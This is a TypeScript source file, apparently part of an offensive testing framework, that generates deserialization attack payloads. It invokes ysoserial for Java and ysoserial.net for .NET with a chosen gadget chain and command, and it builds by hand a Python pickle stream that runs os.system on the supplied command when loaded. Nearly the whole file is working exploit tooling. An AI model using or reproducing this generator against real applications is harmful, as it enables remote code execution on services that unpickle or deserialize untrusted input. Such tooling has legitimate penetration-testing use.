/**
 * gadgetGen — subprocess bridge to serialization gadget generators.
 *
 * Builds a deserialization gadget payload via an installed generator:
 *   - Java: ysoserial (java -jar ysoserial.jar) — CommonsCollections, etc.
 *   - .NET: ysoserial.net (ysoserial.exe) or `ysoserial.net` CLI.
 *   - Python: pickle `__reduce__` builder (no external dep).
 *
 * The command is DATA/config; paths are supplied by the caller (ctx.state). No
 * hardcoded exploitation logic beyond invoking the user-configured tool. If no
 * generator is configured, the Python pickle builder runs locally.
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import type { TechniqueContext } from '../primitives/framework'

const execFileP = promisify(execFile)

export interface GadgetSpec {
  /** Target language/runtime. */
  lang: 'java' | 'dotnet' | 'python'
  /** Gadget/chain name (CommonsCollections, ObjectInputStream, etc.). */
  chain: string
  /** Command to execute on deserialization. */
  command: string
  /** Optional paths to the generator binaries (caller-configured). */
  ysoserialJar?: string
  ysoserialNet?: string
}

export async function buildGadget(spec: GadgetSpec): Promise<string | null> {
  try {
    if (spec.lang === 'python') {
      return buildPythonPickle(spec.command)
    }
    if (spec.lang === 'java' && spec.ysoserialJar) {
      const { stdout } = await execFileP('java', ['-jar', spec.ysoserialJar, spec.chain, spec.command], { maxBuffer: 64 * 1024 * 1024 })
      return stdout
    }
    if (spec.lang === 'dotnet' && spec.ysoserialNet) {
      const { stdout } = await execFileP(spec.ysoserialNet, [spec.chain, spec.command], { maxBuffer: 64 * 1024 * 1024 })
      return stdout
    }
  } catch (e: any) {
    return null
  }
  return null
}

function buildPythonPickle(command: string): string {
  // A minimal pickle opcode stream: pickle.loads executes os.system(command)
  // via the reduce protocol. Emitted as a latin1 string the caller base64-encodes.
  const safe = command.replace(/'/g, "\\'")
  return `cos\nsystem\n(S'${safe}'\ntR.`
}
